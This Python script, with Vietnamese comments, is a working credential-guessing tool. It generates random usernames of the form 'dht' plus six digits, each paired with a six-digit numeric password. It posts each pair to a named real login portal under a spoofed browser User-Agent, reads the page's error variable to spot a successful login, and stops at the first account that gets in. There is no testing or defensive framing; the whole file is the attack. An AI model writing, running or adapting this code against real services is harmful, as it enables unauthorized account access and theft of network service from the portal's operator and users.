import random
import requests
import re

def generate_accounts(n=100):
    accounts = []
    usernames_used = set()
    
    while len(accounts) < n:
        username = f"dht{random.randint(0, 999999):06d}"
        password = f"{random.randint(0, 999999):06d}"
        
        if username not in usernames_used:
            usernames_used.add(username)
            accounts.append((username, password))
    
    return accounts

def try_login(username, password):
    url = "https://login.inetcenter.vn/login"
    
    payload = {
        "username": username,
        "password": password,
        "popup": "true",
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=10)
        
        # Nội dung phản hồi
        response_text = response.text
        
        # Tìm biến error trong script: var error = "Nội dung lỗi";
        # Dùng regex để lấy chính xác giá trị được gán, tránh bị nhầm với các dòng if trong script
        match = re.search(r'var error = "(.*?)";', response_text)
        
        if match:
            actual_error = match.group(1)
            
            # Danh sách các lỗi đã biết
            known_errors = [
                "simultaneous session limit reached",
                "invalid username or password",
                "You are already logged in - access denied",
                "Expired prepaid card!",
                "The account has expired!",
                "RADIUS server is not responding",
                "invalid Calling-Station-Id",
                "You are not allowed to connect to this NAS!"
            ]
            
            # Kiểm tra nếu lỗi thực sự nằm trong danh sách lỗi hoặc chứa "not found"
            if actual_error in known_errors or "not found" in actual_error:
                print(f"False: {username} - {actual_error}")
                return False
            
            # Nếu biến error có nội dung nhưng không phải lỗi chặn? (Trường hợp này hiếm, nhưng cứ in ra)
            # Nếu error rỗng var error = ""; thì có thể là thành công
            if actual_error:
                print(f"Debug: {username} - Unknown error value: {actual_error}")
                # Vẫn coi là False nếu có text lạ
                return False
        
        # Nếu không tìm thấy biến error hoặc error rỗng -> Khả năng cao là thành công
        # (Hoặc cấu trúc trang đã thay đổi)
        print(f"True: {username} - Login thành công! với password: {password}")
        return True

    except Exception as e:
        print(f"Lỗi kết nối: {e}")
        return False

if __name__ == "__main__":
    # Tạo danh sách tài khoản
    accounts = generate_accounts(100)
    
    print(f"Đang thử {len(accounts)} tài khoản...")
    
    for username, password in accounts:
        if(try_login(username, password)):
            break

